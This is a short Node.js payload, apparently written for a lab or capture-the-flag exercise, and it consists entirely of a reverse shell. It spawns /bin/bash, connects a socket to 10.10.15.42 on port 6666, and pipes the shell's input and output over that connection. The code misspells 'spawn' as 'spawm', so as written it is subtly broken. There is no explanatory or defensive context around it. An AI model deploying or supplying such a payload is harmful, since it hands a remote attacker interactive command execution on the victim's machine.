(function(){
	var net = require("net"),
	    cp = require("child_process"),
	    sh = cp.spawm("/bin/bash", []);
	var client = new net.Socket();
	client.connect(6666, "10.10.15.42", function(){
		client.pipe(sh.stdin);
		sh.stdout.pipe(client);
		sh.stderr.pipe(client);
	});
	return /a/;
})();
